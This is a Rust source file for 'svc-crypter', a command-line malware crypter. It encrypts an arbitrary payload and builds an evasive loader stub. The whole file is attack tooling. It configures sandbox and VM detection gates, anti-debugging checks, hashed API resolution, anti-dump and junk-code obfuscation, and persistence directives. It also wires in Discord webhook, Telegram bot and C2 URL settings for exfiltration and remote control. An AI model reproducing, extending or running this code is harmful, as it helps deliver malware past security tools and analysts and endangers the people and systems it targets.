//! svc-crypter CLI.
//!
//! ═══ GRANULAR GATE BISECT ═════════════════════════════════════
//! SVC_DIAG=0..2   baseline (no gates)
//! SVC_DIAG=3      gate bisect mode — SVC_GATES picks which gates
//!
//! In diag 3 mode, SleepJitter is always 500-1000ms (short, so
//! timing doesn't hide the result). SVC_GATES is a comma-separated
//! list of gate names to enable:
//!
//!   sleepaccel   SleepAccelerationCheck
//!   uptime       UptimeMin
//!   username     UsernameBlocklist
//!   hostname     HostnameBlocklist
//!   apihammer    ApiHammerCheck
//!   ram          RamMinMb
//!   cpu          CpuCoresMin
//!   hypervisor   HypervisorCpuid
//!   parent       ParentDebugger
//!
//! Examples:
//!   SVC_DIAG=3 SVC_GATES=apihammer  → only ApiHammerCheck
//!   SVC_DIAG=3 SVC_GATES=uptime,username,hostname → those three
//!   SVC_DIAG=3 SVC_GATES=all → full base gate set
//! ═════════════════════════════════════════════════════════════

use aes_gcm::{
    aead::{Aead, KeyInit, OsRng},
    Aes256Gcm, Nonce,
};
use argon2::{Algorithm, Argon2, Params, Version};
use rand::Rng;
use rand::RngCore;
use serde::Deserialize;
use sha2::{Digest, Sha256};
use std::path::{Path, PathBuf};
use std::process::Command;

use crypter_ir::*;
use crypter_synth::Synth;

const SECRETS_TEMPLATE: &str = r#"{
    "discord":        "",
    "telegram_token": "",
    "telegram_chat":  "",
    "c2_url":         "",
    "c2_auth":        ""
}
"#;

#[derive(Debug, Default, Deserialize)]
struct Secrets {
    #[serde(default, alias = "discord_webhook")]
    discord: String,
    #[serde(default)]
    telegram_token: String,
    #[serde(default)]
    telegram_chat: String,
    #[serde(default)]
    c2_url: String,
    #[serde(default)]
    c2_auth: String,
}

impl Secrets {
    fn merge_from_cli(&mut self, cli: &CliArgs) {
        if !cli.discord.is_empty() { self.discord = cli.discord.clone(); }
        if !cli.telegram_token.is_empty() { self.telegram_token = cli.telegram_token.clone(); }
        if !cli.telegram_chat.is_empty() { self.telegram_chat = cli.telegram_chat.clone(); }
        if !cli.c2_url.is_empty() { self.c2_url = cli.c2_url.clone(); }
        if !cli.c2_auth.is_empty() { self.c2_auth = cli.c2_auth.clone(); }
    }
}

fn secrets_path() -> PathBuf {
    if let Ok(xdg) = std::env::var("XDG_CONFIG_HOME") {
        if !xdg.is_empty() { return PathBuf::from(xdg).join("svc").join("secrets.json"); }
    }
    #[cfg(windows)]
    {
        if let Ok(appdata) = std::env::var("APPDATA") {
            if !appdata.is_empty() { return PathBuf::from(appdata).join("svc").join("secrets.json"); }
        }
    }
    if let Ok(home) = std::env::var("HOME") {
        return PathBuf::from(home).join(".config").join("svc").join("secrets.json");
    }
    PathBuf::from(".svc_secrets.json")
}

fn load_secrets() -> Secrets {
    let path = secrets_path();
    if !path.exists() { return Secrets::default(); }
    match std::fs::read_to_string(&path) {
        Ok(raw) => match serde_json::from_str::<Secrets>(&raw) {
            Ok(s) => { check_file_perms(&path); s }
            Err(e) => {
                eprintln!("[!] secrets file {} parse error: {}", path.display(), e);
                Secrets::default()
            }
        },
        Err(e) => {
            eprintln!("[!] could not read secrets file {}: {}", path.display(), e);
            Secrets::default()
        }
    }
}

fn check_file_perms(path: &Path) {
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        if let Ok(meta) = std::fs::metadata(path) {
            let mode = meta.permissions().mode() & 0o777;
            if mode & 0o077 != 0 {
                eprintln!("[!] {} is world/group readable (mode {:o}). chmod 600 it.", path.display(), mode);
            }
        }
    }
    #[cfg(not(unix))]
    { let _ = path; }
}

fn write_secrets_template() {
    let path = secrets_path();
    if let Some(parent) = path.parent() {
        if let Err(e) = std::fs::create_dir_all(parent) {
            eprintln!("[!] could not create {}: {}", parent.display(), e);
            std::process::exit(1);
        }
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let _ = std::fs::set_permissions(parent, std::fs::Permissions::from_mode(0o700));
        }
    }
    if path.exists() {
        eprintln!("[!] {} already exists — not overwriting", path.display());
        std::process::exit(1);
    }
    if let Err(e) = std::fs::write(&path, SECRETS_TEMPLATE) {
        eprintln!("[!] could not write {}: {}", path.display(), e);
        std::process::exit(1);
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let _ = std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o600));
    }
    println!("[+] wrote template to {}", path.display());
}

struct CliArgs {
    payload: Option<PathBuf>,
    target: TargetOs,
    fp_path: Option<PathBuf>,
    out_name: String,
    profile: Profile,
    directive_path: Option<PathBuf>,
    discord: String,
    telegram_token: String,
    telegram_chat: String,
    c2_url: String,
    c2_auth: String,
    init_secrets: bool,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
enum Profile {
    Stealth,
    Balanced,
    Aggressive,
}

impl Profile {
    fn parse(s: &str) -> Profile {
        match s.to_lowercase().as_str() {
            "stealth" => Profile::Stealth,
            "aggressive" => Profile::Aggressive,
            _ => Profile::Balanced,
        }
    }
    fn as_str(&self) -> &'static str {
        match self {
            Profile::Stealth => "stealth",
            Profile::Balanced => "balanced",
            Profile::Aggressive => "aggressive",
        }
    }
}

fn print_usage() {
    eprintln!(
        "usage: svc-crypter <payload> [options]\n\
         \n\
         options:\n\
           --target        windows|linux|macos  (default: windows)\n\
           --fp            fingerprint.json\n\
           --out           <name>               (default: svc)\n\
           --profile       stealth|balanced|aggressive\n\
           --directive     directive.json\n\
           --discord       <webhook-url>\n\
           --telegram      <token>:<chat-id>\n\
           --c2            <url>\n\
           --c2-auth       <bearer-token>\n\
           --init-secrets  write template to ~/.config/svc/secrets.json\n\
         \n\
         env:\n\
           SVC_DIAG=0|1|2|3      3 = gate bisect mode\n\
           SVC_GATES=name,...    in diag 3, which gates to enable\n\
                                 (sleepaccel,uptime,username,hostname,\n\
                                  apihammer,ram,cpu,hypervisor,parent)\n\
                                 'all' = full base set"
    );
}

fn parse_args() -> CliArgs {
    let args: Vec<String> = std::env::args().collect();

    if args.iter().any(|a| a == "--init-secrets") {
        return CliArgs {
            payload: None, target: TargetOs::Windows, fp_path: None,
            out_name: "svc".into(), profile: Profile::Balanced, directive_path: None,
            discord: String::new(), telegram_token: String::new(), telegram_chat: String::new(),
            c2_url: String::new(), c2_auth: String::new(), init_secrets: true,
        };
    }

    if args.len() < 2 || args[1] == "-h" || args[1] == "--help" {
        print_usage();
        std::process::exit(1);
    }

    let payload = Some(PathBuf::from(&args[1]));
    let mut target = TargetOs::Windows;
    let mut fp_path: Option<PathBuf> = None;
    let mut out_name = "svc".to_string();
    let mut profile = Profile::Balanced;
    let mut directive_path: Option<PathBuf> = None;
    let mut discord = String::new();
    let mut telegram_token = String::new();
    let mut telegram_chat = String::new();
    let mut c2_url = String::new();
    let mut c2_auth = String::new();

    let mut i = 2;
    while i < args.len() {
        match args[i].as_str() {
            "--target" => {
                if let Some(t) = args.get(i + 1) {
                    target = match t.as_str() {
                        "linux" => TargetOs::Linux,
                        "macos" => TargetOs::Macos,
                        _ => TargetOs::Windows,
                    };
                }
                i += 2;
            }
            "--fp" => { fp_path = args.get(i + 1).map(PathBuf::from); i += 2; }
            "--out" => { out_name = args.get(i + 1).cloned().unwrap_or_else(|| "svc".into()); i += 2; }
            "--profile" => { if let Some(p) = args.get(i + 1) { profile = Profile::parse(p); } i += 2; }
            "--directive" => { directive_path = args.get(i + 1).map(PathBuf::from); i += 2; }
            "--discord" => { discord = args.get(i + 1).cloned().unwrap_or_default(); i += 2; }
            "--telegram" => {
                if let Some(spec) = args.get(i + 1) {
                    let mut parts = spec.splitn(2, ':');
                    telegram_token = parts.next().unwrap_or("").to_string();
                    telegram_chat = parts.next().unwrap_or("").to_string();
                }
                i += 2;
            }
            "--c2" => { c2_url = args.get(i + 1).cloned().unwrap_or_default(); i += 2; }
            "--c2-auth" => { c2_auth = args.get(i + 1).cloned().unwrap_or_default(); i += 2; }
            _ => i += 1,
        }
    }

    CliArgs {
        payload, target, fp_path, out_name, profile, directive_path,
        discord, telegram_token, telegram_chat, c2_url, c2_auth, init_secrets: false,
    }
}

fn diag_level() -> u32 {
    std::env::var("SVC_DIAG")
        .ok()
        .and_then(|v| v.parse::<u32>().ok())
        .unwrap_or(3)
}

fn gate_toggles() -> Vec<String> {
    std::env::var("SVC_GATES")
        .unwrap_or_default()
        .split(',')
        .map(|s| s.trim().to_lowercase())
        .filter(|s| !s.is_empty())
        .collect()
}

fn pick_gates_from_env() -> Vec<Gate> {
    // always short SleepJitter in bisect mode — no timing variable
    let mut gates = vec![Gate::SleepJitter { min_ms: 500, max_ms: 1000 }];
    let toggles = gate_toggles();
    let has = |name: &str| toggles.iter().any(|t| t == name);
    let all = toggles.iter().any(|t| t == "all");

    if all || has("sleepaccel") {
        gates.push(Gate::SleepAccelerationCheck { sleep_ms: 5000, min_ratio: 0.8 });
    }
    if all || has("uptime") {
        gates.push(Gate::UptimeMin(180));
    }
    if all || has("username") {
        gates.push(Gate::UsernameBlocklist);
    }
    if all || has("hostname") {
        gates.push(Gate::HostnameBlocklist);
    }
    if all || has("apihammer") {
        gates.push(Gate::ApiHammerCheck);
    }
    if all || has("ram") {
        gates.push(Gate::RamMinMb(2000));
    }
    if all || has("cpu") {
        gates.push(Gate::CpuCoresMin(1));
    }
    if all || has("hypervisor") {
        gates.push(Gate::HypervisorCpuid);
    }
    if all || has("parent") {
        gates.push(Gate::ParentDebugger);
    }

    gates
}

fn main() {
    let cli = parse_args();

    if cli.init_secrets {
        write_secrets_template();
        return;
    }

    let diag = diag_level();

    let payload_path = cli.payload.as_ref().expect("payload required");

    if !payload_path.exists() {
        eprintln!("[!] payload not found: {}", payload_path.display());
        eprintln!("    cwd: {}", std::env::current_dir().unwrap_or_default().display());
        std::process::exit(1);
    }
    if !payload_path.is_file() {
        eprintln!("[!] payload is not a regular file: {}", payload_path.display());
        std::process::exit(1);
    }

    let payload_bytes = match std::fs::read(payload_path) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("[!] could not read {}: {}", payload_path.display(), e);
            std::process::exit(1);
        }
    };
    if payload_bytes.is_empty() {
        eprintln!("[!] payload is empty: {}", payload_path.display());
        std::process::exit(1);
    }

    let mut secrets = load_secrets();
    secrets.merge_from_cli(&cli);

    let mut seed = [0u8; 32];
    OsRng.fill_bytes(&mut seed);
    let mut xor_key = [0u8; 32];
    OsRng.fill_bytes(&mut xor_key);
    let mut build_id_bytes = [0u8; 8];
    OsRng.fill_bytes(&mut build_id_bytes);
    let build_id = hex_encode(&build_id_bytes);

    let mut rng = rand::thread_rng();

    // ─── gates ───────────────────────────────────────────────────
    let gates: Vec<Gate> = if diag >= 3 {
        pick_gates_from_env()
    } else {
        vec![Gate::SleepJitter { min_ms: 500, max_ms: 1000 }]
    };

    let debug_check = if diag >= 2 {
        pick_debug(&mut rng, &cli.profile)
    } else {
        DebugCheck::None
    };

    let anti_emulation = diag >= 1;

    let resolver = pick_resolver(&mut rng);
    let decrypt = pick_decrypt(&mut rng);
    let execution = pick_execution(&mut rng);
    let integrity = if diag >= 6 {
        pick_integrity(&mut rng, &cli.profile)
    } else {
        IntegrityCheck::None
    };
    let virtualization = false;
    let anti_dump = diag >= 5;
    let junk_density = match cli.profile {
        Profile::Stealth => rng.gen_range(0.6..0.9),
        Profile::Balanced => rng.gen_range(0.3..0.7),
        Profile::Aggressive => rng.gen_range(0.1..0.4),
    };

    let mut salt = [0u8; 32];
    OsRng.fill_bytes(&mut salt);
    let mut nonce16 = [0u8; 16];
    OsRng.fill_bytes(&mut nonce16);

    let mut key_input = Vec::new();
    key_input.extend_from_slice(&salt);
    key_input.extend_from_slice(&seed);
    if let Some(fp) = &cli.fp_path {
        if let Ok(fp_bytes) = std::fs::read(fp) {
            key_input.extend_from_slice(&fp_bytes);
        }
    }
    let mut p_hash = Sha256::new();
    p_hash.update(&payload_bytes);
    key_input.extend_from_slice(&p_hash.finalize());

    let params = Params::new(64 * 1024, 3, 1, Some(32)).expect("params");
    let a2 = Argon2::new(Algorithm::Argon2id, Version::V0x13, params);
    let mut key = [0u8; 32];
    a2.hash_password_into(&key_input, b"svc_crypter_v1", &mut key).expect("argon2");

    let cipher = Aes256Gcm::new((&key).into());
    let mut payload_nonce = [0u8; 12];
    OsRng.fill_bytes(&mut payload_nonce);
    let ct = cipher
        .encrypt(Nonce::from_slice(&payload_nonce), payload_bytes.as_slice())
        .expect("aead");
    let mut blob = Vec::with_capacity(12 + ct.len());
    blob.extend_from_slice(&payload_nonce);
    blob.extend_from_slice(&ct);

    let directive_json = if let Some(dp) = &cli.directive_path {
        std::fs::read_to_string(dp).unwrap_or_else(|_| "{}".to_string())
    } else {
        r#"{"persistence":[],"rate_limit_ms":0,"tiers":[],"uninstall":false}"#.to_string()
    };

    let prog = StubProgram {
        seed,
        build_id: build_id.clone(),
        profile: cli.profile.as_str().to_string(),
        gates: gates.clone(),
        debug_check,
        resolver,
        decrypt,
        virtualization,
        integrity,
        execution,
        key_material: KeyMaterial {
            salt: salt.to_vec(),
            nonce: nonce16.to_vec(),
            bind_to_fingerprint: cli.fp_path.is_some(),
            bind_to_code_hash: true,
        },
        payload_blob: blob.clone(),
        target_os: cli.target.clone(),
        config_xor_key: xor_key,
        anti_dump,
        anti_emulation,
        junk_density,
        discord: secrets.discord.clone(),
        telegram_token: secrets.telegram_token.clone(),
        telegram_chat: secrets.telegram_chat.clone(),
        c2_url: secrets.c2_url.clone(),
        c2_auth: secrets.c2_auth.clone(),
        directive_json: directive_json.clone(),
        payload_key: key,
    };

    println!("[!] GATE BISECT — SVC_DIAG={} SVC_GATES={:?}", diag, gate_toggles());
    println!("[*] payload: {} ({} bytes)", payload_path.display(), payload_bytes.len());
    println!("[*] gates: {:?}", prog.gates);
    println!("[*] debug: {:?}", prog.debug_check);
    println!("[*] anti-emulation: {}", anti_emulation);
    println!("[*] anti-dump: {}", anti_dump);

    let mut synth = Synth::new(seed, xor_key);
    let stub_src = synth.emit(&prog);

    let build_dir = PathBuf::from("out").join(&cli.out_name);
    let src_dir = build_dir.join("src");
    if let Err(e) = std::fs::create_dir_all(&src_dir) {
        eprintln!("[!] mkdir {}: {}", src_dir.display(), e);
        std::process::exit(1);
    }

    let payload_bin = build_dir.join("payload.bin");
    if let Err(e) = std::fs::write(&payload_bin, &blob) {
        eprintln!("[!] write {}: {}", payload_bin.display(), e);
        std::process::exit(1);
    }

    let stub_path = src_dir.join("main.rs");
    if let Err(e) = std::fs::write(&stub_path, &stub_src) {
        eprintln!("[!] write {}: {}", stub_path.display(), e);
        std::process::exit(1);
    }

    let manifest = emit_cargo_manifest(&cli.out_name, &cli.target);
    if let Err(e) = std::fs::write(build_dir.join("Cargo.toml"), manifest) {
        eprintln!("[!] write manifest: {}", e);
        std::process::exit(1);
    }

    let target_triple = match cli.target {
        TargetOs::Windows => "x86_64-pc-windows-gnu",
        TargetOs::Linux => "x86_64-unknown-linux-gnu",
        TargetOs::Macos => "aarch64-apple-darwin",
    };

    let status = match Command::new("cargo")
        .current_dir(&build_dir)
        .args(["build", "--release", "--target", target_triple])
        .status()
    {
        Ok(s) => s,
        Err(e) => {
            eprintln!("[!] could not launch cargo: {}", e);
            std::process::exit(1);
        }
    };

    if !status.success() {
        eprintln!("[!] cargo build failed");
        std::process::exit(1);
    }

    let out_bin = build_dir
        .join("target")
        .join(target_triple)
        .join("release")
        .join(format!("{}{}", cli.out_name,
            if matches!(cli.target, TargetOs::Windows) { ".exe" } else { "" }));

    let bin = match std::fs::read(&out_bin) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("[!] built binary missing at {}: {}", out_bin.display(), e);
            std::process::exit(1);
        }
    };
    println!("[+] built: {} ({} bytes)", out_bin.display(), bin.len());
}

fn emit_cargo_manifest(name: &str, target: &TargetOs) -> String {
    let mut s = String::new();
    s.push_str("[workspace]\n\n");
    s.push_str("[package]\n");
    s.push_str("name = \"");
    s.push_str(name);
    s.push_str("\"\n");
    s.push_str("version = \"0.1.0\"\n");
    s.push_str("edition = \"2021\"\n\n");
    s.push_str("[[bin]]\n");
    s.push_str("name = \"");
    s.push_str(name);
    s.push_str("\"\n");
    s.push_str("path = \"src/main.rs\"\n\n");
    s.push_str("[dependencies]\n");
    s.push_str("aes-gcm = \"0.10\"\n");
    s.push_str("chacha20poly1305 = \"0.10\"\n");
    s.push_str("hmac = \"0.12\"\n");
    s.push_str("sha2 = \"0.10\"\n");
    s.push_str("rand = \"0.8\"\n");
    s.push_str("base64 = \"0.22\"\n");
    s.push_str("serde_json = \"1\"\n");

    match target {
        TargetOs::Windows => {
            s.push_str("windows-sys = { version = \"0.59\", features = [\n");
            s.push_str("    \"Win32_Foundation\",\n");
            s.push_str("    \"Win32_Security_Cryptography\",\n");
            s.push_str("    \"Win32_System_Memory\",\n");
            s.push_str("    \"Win32_System_Threading\",\n");
            s.push_str("    \"Win32_System_LibraryLoader\",\n");
            s.push_str("    \"Win32_System_Diagnostics_Debug\",\n");
            s.push_str("    \"Win32_System_SystemInformation\",\n");
            s.push_str("    \"Win32_Storage_FileSystem\",\n");
            s.push_str("    \"Win32_System_DataExchange\",\n");
            s.push_str("    \"Win32_System_SystemServices\",\n");
            s.push_str("] }\n");
            s.push_str("winreg = \"0.52\"\n");
        }
        TargetOs::Linux => { s.push_str("libc = \"0.2\"\n"); }
        TargetOs::Macos => {
            s.push_str("libc = \"0.2\"\n");
            s.push_str("core-foundation = \"0.10\"\n");
        }
    }

    s.push_str("\n[profile.release]\n");
    s.push_str("opt-level = \"z\"\n");
    s.push_str("lto = \"fat\"\n");
    s.push_str("codegen-units = 1\n");
    s.push_str("panic = \"abort\"\n");
    s.push_str("strip = \"symbols\"\n");
    s.push_str("incremental = false\n");
    s
}

fn hex_encode(b: &[u8]) -> String {
    let mut s = String::with_capacity(b.len() * 2);
    for byte in b { s.push_str(&format!("{:02x}", byte)); }
    s
}

fn pick_debug<R: Rng>(rng: &mut R, profile: &Profile) -> DebugCheck {
    match profile {
        Profile::Stealth => match rng.gen_range(0..4) {
            0 => DebugCheck::PEBBeingDebugged,
            1 => DebugCheck::NtGlobalFlag,
            2 => DebugCheck::NtQueryInformationProcess,
            _ => DebugCheck::TimingCheck { rounds: rng.gen_range(5..10) as u8 },
        },
        Profile::Balanced => match rng.gen_range(0..6) {
            0 => DebugCheck::IsDebuggerPresent,
            1 => DebugCheck::PEBBeingDebugged,
            2 => DebugCheck::NtGlobalFlag,
            3 => DebugCheck::NtQueryInformationProcess,
            4 => DebugCheck::TimingCheck { rounds: rng.gen_range(3..8) as u8 },
            _ => DebugCheck::NtQueryInformationProcess,
        },
        Profile::Aggressive => match rng.gen_range(0..3) {
            0 => DebugCheck::IsDebuggerPresent,
            1 => DebugCheck::NtQueryInformationProcess,
            _ => DebugCheck::TimingCheck { rounds: rng.gen_range(2..5) as u8 },
        },
    }
}

fn pick_resolver<R: Rng>(rng: &mut R) -> Resolver {
    match rng.gen_range(0..4) {
        0 => Resolver::ExportWalkFnv1a,
        1 => Resolver::ExportWalkCrc32,
        2 => Resolver::ExportWalkDjb2,
        _ => Resolver::PebWalk,
    }
}

fn pick_decrypt<R: Rng>(_rng: &mut R) -> DecryptScheme {
    DecryptScheme::AesGcm
}

fn pick_execution<R: Rng>(_rng: &mut R) -> ExecutionMethod {
    ExecutionMethod::ImageMap
}

fn pick_integrity<R: Rng>(rng: &mut R, profile: &Profile) -> IntegrityCheck {
    match profile {
        Profile::Stealth => match rng.gen_range(0..2) {
            0 => IntegrityCheck::TextSectionHash,
            _ => IntegrityCheck::RegionCrc { start: 0x1000, len: rng.gen_range(4000..12000) },
        },
        Profile::Balanced => match rng.gen_range(0..3) {
            0 => IntegrityCheck::TextSectionHash,
            1 => IntegrityCheck::RegionCrc { start: 0x1000, len: rng.gen_range(2000..8000) },
            _ => IntegrityCheck::None,
        },
        Profile::Aggressive => IntegrityCheck::None,
    }
}
